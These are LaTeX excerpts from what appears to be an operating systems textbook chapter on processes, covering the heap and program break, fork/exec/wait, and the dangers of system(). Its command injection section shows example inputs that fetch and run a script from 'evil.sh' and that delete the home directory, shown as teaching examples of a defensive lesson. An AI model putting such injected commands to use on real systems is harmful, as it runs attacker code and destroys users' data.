...
The heap starts just above the data segments described below and grows upward.
Its upper end is called the \keyword{program break}, and \keyword{malloc} may push it upward using \keyword{brk} or \keyword{sbrk}.
...
\begin{itemize}
    \item \textbf{Initialized Data Segment}
          ...
          This section starts just after the text segment and has a constant size because the number of globals is known at compile time.
...
\begin{figure}[H]
\centering
\includegraphics[width=.3\textwidth,alt={A process address space from bottom to top: text, data, heap, and stack. Arrows show the heap growing upward and the stack growing downward toward each other.}]{processes/drawings/address_space.eps}
...
Another is the shell's built-in \keyword{exec}, which replaces the shell instead of forking, so it works even when no new processes can be created.
For example, \keyword{exec kill -9 -1} kills all of your processes.
You only get one attempt, because your shell is replaced.
...
\begin{figure}[H]
\centering
\includegraphics[width=.3\textwidth,alt={Three successive fork calls create four processes that sleep for 1, 3, 2 and 4 seconds. Each prints its number and exits when it wakes, so the numbers are printed in sorted order: 1, 2, 3, 4.}]{processes/drawings/sleepsort_timing.eps}
...
\item Open file descriptors stay open across exec unless they are marked close-on-exec (\keyword{O\_CLOEXEC}), and closed ones stay closed. The exception is a setuid program: some systems open \keyword{/dev/null} on any of 0, 1 or 2 that are closed, so the program can't accidentally write into a file it opens later.
...
The string is interpreted by a shell, so a single call to \keyword{system} can run more than one command:
...
This prints the contents of the current directory, then the message.
...
Because \keyword{system} passes the whole string to a shell, the shell interprets any special characters in \keyword{argv[1]}.
Passing something along the lines of \keyword{argv[1] = "; curl evil.sh | sh"} makes the program run \keyword{ls}, then download and run an attacker's script.
Similarly, \keyword{argv[1] = "; rm -rf \textasciitilde"} deletes the user's home directory.
This is called \href{https://en.wikipedia.org/wiki/Code\_injection\#Shell\_injection}{command injection}.
The characters \keyword{;}, \keyword{|}, \keyword{\&\&}, \keyword{\$(...)} and backticks all let input start new commands, and even a filename containing a space is split into two arguments.
In this example, the user could have typed those commands themselves, so nothing is gained.
But if the program runs with more privilege than the person supplying the input -- a setuid program, or a server that builds the command from a web request -- command injection becomes \href{https://en.wikipedia.org/wiki/Privilege\_escalation}{privilege escalation}.
Calling \keyword{exec} directly, for example \keyword{execlp("ls", "ls", argv[1], (char *) NULL)}, avoids the problem because no shell ever interprets the argument: it is passed to \keyword{ls} as a single word.
...
\begin{figure}[H]
\centering
\includegraphics[width=.7\textwidth,alt={The parent calls fork. The child branches off and calls exec to run a new program while the parent calls wait, and the parent continues once the child finishes.}]{processes/drawings/fork_exec_wait.eps}
...
\begin{itemize}
    \item
          What is the difference between the \keyword{exec} functions with a p and without a p? When a program calls \keyword{execvp("ls", ...)}, who searches the \keyword{PATH} for \keyword{ls} -- the operating system or the C library?
    \item
